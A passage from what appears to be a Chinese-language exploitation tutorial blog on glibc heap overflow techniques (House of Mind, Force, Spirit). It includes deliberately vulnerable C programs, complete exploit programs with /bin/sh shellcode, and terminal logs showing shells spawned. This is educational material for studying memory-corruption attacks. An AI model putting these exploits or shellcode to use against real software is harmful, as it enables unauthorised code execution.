<p>攻击者生成数据文件作为用户输入，当漏洞程序的第[4]行执行时，’glibc malloc’会做以下事情：</p>
<ul>
<li>调用arena_for_chunk 宏获取正被释放中的chunk的arena<ul>
<li><a href="https://github.com/sploitfun/lsploits/blob/master/hof/hom/malloc_snip.c#L47" target="_blank" rel="external">arena_for_chunk</a>: 如果NON_MAIN_ARENA (N)位没有被设置，返回主arena(main arena)。如果已经设置，通过将chunk地址对其多倍的HEAP_MAX_SIZE访问相应的heap_info结构体。然后，返回获取heap_info结构体的arena指针。在我们的例子中，ON_MAIN_ARENA (N)被攻击者设置，所以得到了正要被释放的chunk的heap_info结构体(位于地址0x0810000处)。heap_info的ar_ptr = Fake arena的基地址(0x0804a018)。</li>
</ul>
</li>
<li>以arena指针和chunk地址作为参数调用_int_free。在我们的例子中，arena指针指向fake arena， 因此fake arena和chun地址作为参数传递到_int_free。<ul>
<li>Fake arena: 以下是fake arena中需要被攻击者覆盖的必要域:<pre><code>+ [Mutex](https://github.com/sploitfun/lsploits/blob/master/hof/hom/malloc_snip.c#L14)- 必须处于解锁状态(unlocked state).
+ [Bins](https://github.com/sploitfun/lsploits/blob/master/hof/hom/malloc_snip.c#L29)- 未排序的bin fd必须含有free函数的GOT表项地址-12
+ [Top](https://github.com/sploitfun/lsploits/blob/master/hof/hom/malloc_snip.c#L23)- 
        + Top地址必须不等于正被释放的chunk地址
        + Top地址必须大于下一个chunk地址
+ [System Memory](https://github.com/sploitfun/lsploits/blob/master/hof/hom/malloc_snip.c#L41)- System memory必须大于下一个chunk的size。
</code></pre><ul>
<li>_int_free():<ul>
<li>如果chunk没有<a href="https://github.com/sploitfun/lsploits/blob/master/hof/hom/malloc_snip.c#L68" target="_blank" rel="external">被映射</a>(non mmap’d)，获取锁。在我们的例子中，chunk没有被映射并且fake arena的mutex lock也被成功获取。</li>
<li><a href="https://github.com/sploitfun/lsploits/blob/master/hof/hom/malloc_snip.c#L87" target="_blank" rel="external">合并</a>：<pre><code>+ 查找前一个chunk是否空闲，如果空闲，则合并。在我们的例子中，前一个chunk被分配，因此不能向后合并。
+ 查找下一个chunk是否空闲，如果空闲，则合并。在我们的例子中，下一个chunk被分配，因此可以向前合并。
</code></pre></li>
<li>将当前释放的chunk放入未被排序的bin中。在我们的例子中，fake arena的未排序bin的fs含有free函数的GOT表项地址（12），被拷贝到<a href="https://github.com/sploitfun/lsploits/blob/master/hof/hom/malloc_snip.c#L100" target="_blank" rel="external">‘fwd’</a>中。之后，<a href="https://github.com/sploitfun/lsploits/blob/master/hof/hom/malloc_snip.c#L109" target="_blank" rel="external">当前被释放的chunk的地址被拷贝到’fwd-&gt;bk’中</a>。 bk位于malloc_chunk的12偏移处，因此12加入到’fwd’值中(ie. free- 12+12)。现在free的GOT表项被当前释放的chunk地址修改。由于攻击者已经将shellcode放入到当前被释放的chunk中，从现在开始，只要free被调用，攻击者的shellcode就会执行。</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>把攻击者的数据文件当做用户输入，执行上述漏洞代码，就会执行攻击者的shellcode，如下所示</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">sploitfun@sploitfun-VirtualBox:~/lsploits/hof/hom$ gcc -g -z norelro -z execstack -o vuln vuln.c -Wl,--rpath=/home/sploitfun/glibc/glibc-inst2<span class="number">.20</span>/lib -Wl,--dynamic-linker=/home/sploitfun/glibc/glibc-inst2<span class="number">.20</span>/lib/ld-linux.so<span class="number">.2</span></div><div class="line">sploitfun@sploitfun-VirtualBox:~/lsploits/hof/hom$ gcc -g -o <span class="built_in">exp</span> <span class="built_in">exp</span>.c</div><div class="line">sploitfun@sploitfun-VirtualBox:~/lsploits/hof/hom$ ./<span class="built_in">exp</span> &gt; file</div><div class="line">sploitfun@sploitfun-VirtualBox:~/lsploits/hof/hom$ ./vuln &lt; file</div><div class="line">ptr found at <span class="number">0x804a008</span></div><div class="line">good heap allignment found on <span class="built_in">malloc</span>() <span class="number">724</span> (<span class="number">0x81002a0</span>)</div><div class="line">uid=<span class="number">1000</span>(sploitfun) gid=<span class="number">1000</span>(sploitfun) groups=<span class="number">1000</span>(sploitfun),<span class="number">4</span>(adm),<span class="number">24</span>(cdrom),<span class="number">27</span>(sudo),<span class="number">30</span>(dip),<span class="number">46</span>(plugdev),<span class="number">109</span>(lpadmin),<span class="number">124</span>(sambashare)</div></pre></td></tr></table></figure>
<p><u>保护</u>: 现如今，由于’glibc malloc’ 被强化(got hardened)， house of mind技术不再有效。为阻止house of mind带来的堆溢出，添加了一下检查：</p>
<ul>
<li><a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L3990" target="_blank" rel="external">损坏的chunks</a>: 未排序的bin的第一个chunk的bk指针必须执行未排序的bin，否则，’glibc malloc’就会抛出一个损坏的chunk错误。</li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</div><div class="line">        &#123;</div><div class="line">          errstr = <span class="string">"free(): corrupted unsorted chunks"</span>;</div><div class="line">          <span class="keyword">goto</span> errout;</div><div class="line">        &#125;</div></pre></td></tr></table></figure>
<h3 id="0X02-House-of-Force"><a href="#0X02-House-of-Force" class="headerlink" title="0X02 House of Force"></a>0X02 House of Force</h3><p>通过这项技术，攻击者滥用top chunk的size，利用top chunk欺骗’glibc malloc’来服务大量的内存请求(比堆的系统内存大小要打)。如此一来，当发出一个新的malloc请求，free的GOT表项就会被shellcode地址覆盖。从现在开始，只要free被调用，shellcode就会执行。</p>
<p><u>假设条件</u>: 需要三个malloc调用才能成功利用house of force 技术：</p>
<ul>
<li>Malloc 1: 攻击者必须能控制top chunk的大小。 这堆样就能在这个分配的chunk(物理上在top chunk前面)中溢出。</li>
<li>Malloc 2: 攻击者必须能控制这个malloc请求的大小</li>
<li>Malloc 3: 用户输入必须拷贝到这个已经分配的chunk中。</li>
</ul>
<p><u>漏洞程序</u>:这个漏洞程序满足上述假设条件.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/*</span></div><div class="line">House of force vulnerable program. </div><div class="line">*/</div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span> </span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></div><div class="line">&#123;</div><div class="line">        <span class="keyword">char</span> *buf1, *buf2, *buf3;</div><div class="line">        <span class="keyword">if</span> (argc != <span class="number">4</span>) &#123;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"Usage Error\n"</span>);</div><div class="line">                <span class="keyword">return</span>;</div><div class="line">        &#125;</div><div class="line">        [<span class="number">1</span>]buf1 = <span class="built_in">malloc</span>(<span class="number">256</span>);</div><div class="line">        [<span class="number">2</span>]<span class="built_in">strcpy</span>(buf1, argv[<span class="number">1</span>]); <span class="comment">/* Prereq 1 */</span></div><div class="line">        [<span class="number">3</span>]buf2 = <span class="built_in">malloc</span>(strtoul(argv[<span class="number">2</span>], <span class="literal">NULL</span>, <span class="number">16</span>)); <span class="comment">/* Prereq 2 */</span></div><div class="line">        [<span class="number">4</span>]buf3 = <span class="built_in">malloc</span>(<span class="number">256</span>); <span class="comment">/* Prereq 3 */</span></div><div class="line">        [<span class="number">5</span>]<span class="built_in">strcpy</span>(buf3, argv[<span class="number">3</span>]); <span class="comment">/* Prereq 3 */</span></div><div class="line"></div><div class="line">        [<span class="number">6</span>]<span class="built_in">free</span>(buf3);</div><div class="line">        <span class="built_in">free</span>(buf2);</div><div class="line">        <span class="built_in">free</span>(buf1);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>漏洞程序的堆内存如下所示：</p>
<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/maleficarum3.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/maleficarum3.png" width="450"></a><br>    <figcaption></figcaption><br></figure>


<p>漏洞程序的第[2]行就是堆溢出发生的地方。为了能成功利用堆溢出，攻击者要提供下面的命令行参数:</p>
<ul>
<li>argv[1] - Shellcode + Pad + Top chunk size被拷贝到第一个malloc chunk</li>
<li>argv[2]- 传递给第一个malloc chunk的size参数</li>
<li>argv[3]- 用户输入被拷贝到第三个malloc chunk</li>
</ul>
<p><u>漏洞利用程序</u>：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">/* Program to exploit executable 'vuln' using hof technique.</div><div class="line"> */</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line"></div><div class="line">#define VULNERABLE "./vuln"</div><div class="line">#define FREE_ADDRESS 0x08049858-0x8</div><div class="line">#define MALLOC_SIZE "0xFFFFF744"</div><div class="line">#define BUF3_USER_INP "\x08\xa0\x04\x08"</div><div class="line">                </div><div class="line">/* Spawn a shell. Size - 25 bytes. */</div><div class="line">char scode[] =</div><div class="line">        "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";</div><div class="line">        </div><div class="line">int main( void )</div><div class="line">&#123;       </div><div class="line">        int i;</div><div class="line">        char * p;</div><div class="line">        char argv1[ 265 ];</div><div class="line">        char * argv[] = &#123; VULNERABLE, argv1, MALLOC_SIZE, BUF3_USER_INP, NULL &#125;;</div><div class="line">        </div><div class="line">        strcpy(argv1,scode);</div><div class="line">        for(i=25;i&lt;260;i++)</div><div class="line">                argv1[i] = 'A';</div><div class="line">        </div><div class="line">        strcpy(argv1+260,"\xFF\xFF\xFF\xFF"); /* Top chunk size */</div><div class="line">        argv[264] = ''; /* Terminating NULL character */ </div><div class="line"></div><div class="line">        /* Execution of the vulnerable program */</div><div class="line">        execve( argv[0], argv, NULL );</div><div class="line">        return( -1 );</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">`</div></pre></td></tr></table></figure>
<p>一旦攻击者的命令行参数被拷贝到堆中，漏洞程序的堆内存变为下图所示：</p>
<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/maleficarum4.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/maleficarum4.png" width="450"></a><br>    <figcaption></figcaption><br></figure>

<p>有了攻击者这些参数，就会发生下面的事情：</p>
<p>第[2]行覆盖top chunk的size域：</p>
<pre><code>- 攻击者参数(argv[1] – Shellcode + Pad + 0xFFFFFFFF)拷贝到堆缓冲区&apos;buf1&apos;。 由于argv[1]大于256，top chunk的size域被“0xFFFFFFFF&quot;覆盖
</code></pre><p>第[3]行通过<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L3758" target="_blank" rel="external">top chunk代码</a>分配一个非常大的内存块</p>
<ul>
<li>请求一个大内存块的目的是在分配后top chunk必须位于free的GOT表项的前8个字节。因此，只要再多一个内存分配请求而（第[4]行)就可以帮助我们覆盖free的GOT表项了。</li>
<li>攻击者参数(argv[2] – 0xFFFFF744)作为参数传递给第二个malloc调用(第[3]行)。size参数可以用下面的方式来计算<ul>
<li>size = ((free-8)-top)</li>
<li>在这里<ul>
<li>free指的是可执行文件’vuln’中free的GOT表项，ie)free = 0x08049858</li>
<li>top指的是当前top chunk（在第一次malloc之后，第[1]行) ie)top = 0x0804a108.</li>
<li>因此size = ((0x8049858-0x8)-0x804a108) = -8B8 = 0xFFFFF748</li>
<li>当size =  0xFFFFF748时，我们的目标是将新的tip chunk 的8个字节放到free的GOT表项前面，可以通过这样做到<pre><code>+ (0xFFFFF748+0x804a108) = 0x08049850 = (0x08049858-0x8)
</code></pre></li>
<li>当攻击者传递size参数(0xFFFFF748)时，’glibc malloc’将size 转化为 <a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L3322" target="_blank" rel="external">可用的size(usable size)</a>0xfffff750。因此新的top chunk size将会位于0x8049858而不是0x8049850. 攻击者将传递0xFFFFF744(而不是0xFFFFF748)作为size参数，得到转化后的参数是‘0xFFFFF748’，这正是我们需要的。</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>在第[4]行:</p>
<ul>
<li>由于第三行中的top chunk指向0x8049850,一个256字节的新的内存分配请求会让’glibc malloc’返回0x8049858 ，其会被拷贝到buf3中</li>
</ul>
<p>在第[5]行:</p>
<ul>
<li>将buf1的地址拷贝到buf3中，导致GOT覆盖。因此对free的调用(第[6]行)就会导致shellcode的执行。</li>
</ul>
<p>用攻击者的命令行参数再执行上述漏洞程序就会导致shellcode执行，如下所示:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">sploitfun@sploitfun-VirtualBox:~/lsploits/hof/hof$ gcc -g -z norelro -z execstack -o vuln vuln.c -Wl,--rpath=/home/sploitfun/glibc/glibc-inst2<span class="number">.20</span>/lib -Wl,--dynamic-linker=/home/sploitfun/glibc/glibc-inst2<span class="number">.20</span>/lib/ld-linux.so<span class="number">.2</span></div><div class="line">sploitfun@sploitfun-VirtualBox:~/lsploits/hof/hof$ gcc -g -o <span class="built_in">exp</span> <span class="built_in">exp</span>.c</div><div class="line">sploitfun@sploitfun-VirtualBox:~/lsploits/hof/hof$ ./<span class="built_in">exp</span> </div><div class="line">$ ls</div><div class="line">cmd  <span class="built_in">exp</span>  <span class="built_in">exp</span>.c  vuln  vuln.c</div><div class="line">$ <span class="built_in">exit</span></div><div class="line">sploitfun@sploitfun-VirtualBox:~/lsploits/hof/hof$</div></pre></td></tr></table></figure>
<p><u>保护</u>: 至今为止，还没有针对这项技术的保护措施。所以就算用最新的glibc编译，这项技术也可以帮助我们成功利用堆溢出。</p>
<h3 id="0X03-House-of-Spirit"><a href="#0X03-House-of-Spirit" class="headerlink" title="0X03 House of Spirit"></a>0X03 House of Spirit</h3><p>通过这项技术，攻击者欺骗’glibc malloc’返回一个在栈(不是堆)中的chunk。这就允许攻击者覆盖存储在栈中的返回地址。</p>
<p><u>假设条件</u>: 由于不是所有的堆溢出漏洞程序都能被house of spirit技术成功利用，以下是成功利用的假设条件</p>
<ul>
<li>缓冲区溢出覆盖一个变量，变量中含有’glibc malloc’返回的chunk地址</li>
<li>上述的chunk必须要被释放。攻击者必须控制被释放chunk的size。将chunk的size等于下一个分配的chunk的size。</li>
<li>分配一个chunk</li>
<li>用户输入必须拷贝到上述分配的chunk中</li>
</ul>
<p><u>漏洞程序</u>: 漏洞程序满足上述假设条件</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment">/* vuln.c</span></div><div class="line">House of Spirit vulnerable program</div><div class="line">*/</div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">fvuln</span><span class="params">(<span class="keyword">char</span> *str1, <span class="keyword">int</span> age)</span></span></div><div class="line">&#123;</div><div class="line">   <span class="keyword">char</span> *ptr1, name[<span class="number">44</span>];</div><div class="line">   <span class="keyword">int</span> local_age;</div><div class="line">   <span class="keyword">char</span> *ptr2;</div><div class="line">   [<span class="number">1</span>]local_age = age; <span class="comment">/* Prereq 2 */</span></div><div class="line"></div><div class="line">   [<span class="number">2</span>]ptr1 = (<span class="keyword">char</span> *) <span class="built_in">malloc</span>(<span class="number">256</span>);</div><div class="line">   <span class="built_in">printf</span>(<span class="string">"\nPTR1 = [ %p ]"</span>, ptr1);</div><div class="line">   [<span class="number">3</span>]<span class="built_in">strcpy</span>(name, str1); <span class="comment">/* Prereq 1 */</span></div><div class="line">   <span class="built_in">printf</span>(<span class="string">"\nPTR1 = [ %p ]\n"</span>, ptr1);</div><div class="line">   [<span class="number">4</span>]<span class="built_in">free</span>(ptr1); <span class="comment">/* Prereq 2 */</span></div><div class="line"></div><div class="line">   [<span class="number">5</span>]ptr2 = (<span class="keyword">char</span> *) <span class="built_in">malloc</span>(<span class="number">40</span>); <span class="comment">/* Prereq 3 */</span></div><div class="line">   [<span class="number">6</span>]<span class="built_in">snprintf</span>(ptr2, <span class="number">40</span><span class="number">-1</span>, <span class="string">"%s is %d years old"</span>, name, local_age); <span class="comment">/* Prereq 4 */</span></div><div class="line">   <span class="built_in">printf</span>(<span class="string">"\n%s\n"</span>, ptr2);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></div><div class="line">&#123;</div><div class="line">   <span class="keyword">int</span> i=<span class="number">0</span>;</div><div class="line">   <span class="keyword">int</span> stud_class[<span class="number">10</span>];  <span class="comment">/* Required since nextchunk size should lie in between 8 and arena's system_mem. */</span></div><div class="line">   <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</div><div class="line">        [<span class="number">7</span>]stud_class[i] = <span class="number">10</span>;</div><div class="line">   <span class="keyword">if</span> (argc == <span class="number">3</span>)</div><div class="line">      fvuln(argv[<span class="number">1</span>], <span class="number">25</span>);</div><div class="line">   <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>漏洞程序的栈布局如下所示:</p>
<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/maleficarum5.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/maleficarum5.png" width="450"></a><br>    <figcaption></figcaption><br></figure>

<p>程序的第[3]行是缓冲区溢出发生的地方。为了能成功利用漏洞程序，攻击者提供下面的命令行参数:</p>
<ul>
<li>argv[1] = Shell Code + Stack Address + Chunk size</li>
</ul>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">/* Program to exploit executable 'vuln' using hos technique.</div><div class="line"> */</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line"></div><div class="line">#define VULNERABLE "./vuln"</div><div class="line"></div><div class="line">/* Shellcode to spwan a shell. Size: 48 bytes - Includes Return Address overwrite */</div><div class="line">char scode[] =</div><div class="line">        "\xeb\x0e\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\xb8\xfd\xff\xbf\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x90\x90\x90\x90\x90\x90\x90";</div><div class="line"></div><div class="line">int main( void )</div><div class="line">&#123;</div><div class="line">        int i;</div><div class="line">        char * p;</div><div class="line">        char argv1[54];</div><div class="line">        char * argv[] = &#123; VULNERABLE, argv1, NULL &#125;;</div><div class="line"></div><div class="line">        strcpy(argv1,scode);</div><div class="line"></div><div class="line">        /* Overwrite ptr1 in vuln with stack address - 0xbffffdf0. Overwrite local_age in vuln with chunk size - 0x30 */</div><div class="line">        strcpy(argv1+48,"\xf0\xfd\xff\xbf\x30"); </div><div class="line"></div><div class="line">        argv[53] = '';</div><div class="line"></div><div class="line">        /* Execution of the vulnerable program */</div><div class="line">        execve( argv[0], argv, NULL );</div><div class="line">        return( -1 );</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>攻击者提供参数后，漏洞程序的栈布局如下所示：</p>
<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/maleficarum6.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/maleficarum6.png" width="450"></a><br>    <figcaption></figcaption><br></figure>

<p>攻击者提供参数后，我们来看看返回地址是如何被覆盖的</p>
<p>第[3]行：缓冲区溢出</p>
<ul>
<li>这里，攻击者的输入’argv[1]’拷贝到字符缓冲区’name’中。由于攻击者的输入大于44，ptr1变量和local_age分别被栈地址和chunk size覆盖。<ul>
<li>栈地址-0xbffffdf0- 当第[5]行被执行时，攻击者欺骗’glibc malloc’返回这个地址</li>
<li>Chunk size - 0x30- 当第[4]行执行时，这个chunk size被用来欺骗’glibc malloc’ ，往下看。</li>
</ul>
</li>
</ul>
<p>第[4]行：将栈区域加入到’glibc malloc’的 fast bin</p>
<ul>
<li>free()调用<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L3803" target="_blank" rel="external">_int_free)_</a>。 缓冲区溢出后，ptr1 = 0xbffffdf0(而不是0x804aa08)。被覆盖的ptr1作为参数传递非free()。这样一来，可以欺骗’glibc malloc’来释放位于栈中的内存区域。正要被释放的栈区域位于ptr1-8+4 处，而这已经被攻击者用0x30覆盖，因此’glibc malloc’把这个chunk当做<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L3848" target="_blank" rel="external">fast chunk</a>（因为48&lt;64)，然后将被释放的chunk<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L3910" target="_blank" rel="external">插入</a>到位于<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L3887" target="_blank" rel="external">索引4</a>处的fast binlist的前端。</li>
</ul>
<p>第[5]行:获取栈区域(第[4]行中被添加)</p>
<ul>
<li>对40的分配请求被<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L3322" target="_blank" rel="external">checked_request2size</a>转化为对48的请求。由于可用大小(usable size) ‘48’属于fast chunk中，可以获取它对应的<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L3333" target="_blank" rel="external">fast bin</a>(位于索引4处)。Fast bin的第一个chunk被<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L3341" target="_blank" rel="external">移除</a>并返回为<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L3355" target="_blank" rel="external">用户</a>。第一个chunk什么都不是，但在第[4]行执行期间，栈区域被添加进去了。</li>
</ul>
<p>第[6]行：覆盖返回地址</p>
<ul>
<li>将攻击者的’argv[1]’拷贝到栈区域(被’glibc malloc’返回)，其起始地址是是0xbffffdf0. argv[1]的前16个字节是:<ul>
<li>xeb\x0e - Jmp by 14字节</li>
<li>\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41 – Pad</li>
<li>\xb8\xfd\xff\xbf - 存储在栈中的返回地址被此值覆盖。因此，在fvuln执行之后EIP变为0xbffffdb8- 这块区域俺有jmp指令，随后就是触发shell的shellcode!</li>
</ul>
</li>
</ul>
<p>利用攻击者的参数执行上述漏洞程序，将会执行shellcode,如下所示：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">sploitfun@sploitfun-VirtualBox:~/Dropbox/sploitfun/heap_overflow/Malloc-Maleficarum/hos$ gcc -g -fno-<span class="built_in">stack</span>-protector -z norelro -z execstack -o vuln vuln.c -Wl,--rpath=/home/sploitfun/glibc/glibc-inst2<span class="number">.20</span>/lib -Wl,--dynamic-linker=/home/sploitfun/glibc/glibc-inst2<span class="number">.20</span>/lib/ld-linux.so<span class="number">.2</span></div><div class="line">sploitfun@sploitfun-VirtualBox:~/Dropbox/sploitfun/heap_overflow/Malloc-Maleficarum/hos$ gcc -g -o <span class="built_in">exp</span> <span class="built_in">exp</span>.c</div><div class="line">sploitfun@sploitfun-VirtualBox:~/Dropbox/sploitfun/heap_overflow/Malloc-Maleficarum/hos$ ./<span class="built_in">exp</span> </div><div class="line"></div><div class="line">PTR1 = [ <span class="number">0x804a008</span> ]</div><div class="line">PTR1 = [ <span class="number">0xbffffdf0</span> ]</div><div class="line"></div><div class="line">AAAAAAAAAA����<span class="number">1</span>�Ph<span class="comment">//shh/bin��P��S�</span></div><div class="line">$ ls</div><div class="line">cmd  <span class="built_in">exp</span>  <span class="built_in">exp</span>.c  print	vuln  vuln.c</div><div class="line">$ <span class="built_in">exit</span></div><div class="line">sploitfun@sploitfun-VirtualBox:~/Dropbox/sploitfun/heap_overflow/Malloc-Maleficarum/hos$</div></pre></td></tr></table></figure>
<p><u>保护</u>：至今为止，还没有针对这项技术的保护措施。所以就算用最新的glibc编译，这项技术也可以帮助我们成功利用堆溢出。</p>
<p>###House of Prime<strong>  待更新
</strong>House of Lore**  待更新</p>
<p><u>注意</u>：出于演示目的，上述漏洞程序编译时关闭以下保护机制：</p>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization" target="_blank" rel="external">ASLR</a></li>
<li><a href="https://en.wikipedia.org/wiki/NX_bit" target="_blank" rel="external">NC</a></li>
<li><a href="https://isisblogs.poly.edu/2011/06/01/relro-relocation-read-only/" target="_blank" rel="external">RELRO</a></li>
</ul>
<p><u>参考</u></p>
<p><a href="http://packetstormsecurity.com/files/view/40638/MallocMaleficarum.txt" target="_blank" rel="external">The Malloc Maleficarum</a></p>
<hr>
<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170104/maleficarum" target="_blank" rel="external">Linux(X86)漏洞利用系列-Malloc Maleficarum堆溢出)</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>

      
    </div>
    <footer class="entry-meta entry-footer">
      
	<span class="ico-folder"></span>
    <a class="article-category-link" href="/categories/漏洞利用/">漏洞利用</a>

      
  <span class="ico-tags"></span>
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/">Exploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li></ul>

      
    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/4/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/12/">12</a><a class="extend next" rel="next" href="/page/6/">下一页</a>
  </nav>

</section>
          <aside id="sidebar">
  
    <div class="widget-wrap" style="margin: 20px 0;">
	<div id="search-form-wrap">

    <form class="search-form">
        <label style="width: 75%;">
            <span class="screen-reader-text">Search for:</span>
